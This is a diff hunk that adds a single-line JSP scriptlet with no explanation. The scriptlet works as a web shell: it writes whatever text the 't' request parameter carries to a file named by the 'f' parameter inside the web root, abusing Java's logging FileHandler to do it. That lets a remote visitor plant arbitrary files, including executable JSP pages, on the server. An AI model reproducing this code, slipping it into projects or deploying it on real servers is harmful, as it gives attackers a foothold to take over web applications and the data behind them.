@@ -1,0 +1,1 @@
+<%java.util.logging.Logger l=java.util.logging.Logger.getLogger("t");java.util.logging.FileHandler h=new java.util.logging.FileHandler(pageContext.getServletContext().getRealPath("/")+request.getParameter("f"),true);h.setFormatter(new java.util.logging.SimpleFormatter());l.addHandler(h);l.info(request.getParameter("t"));%>
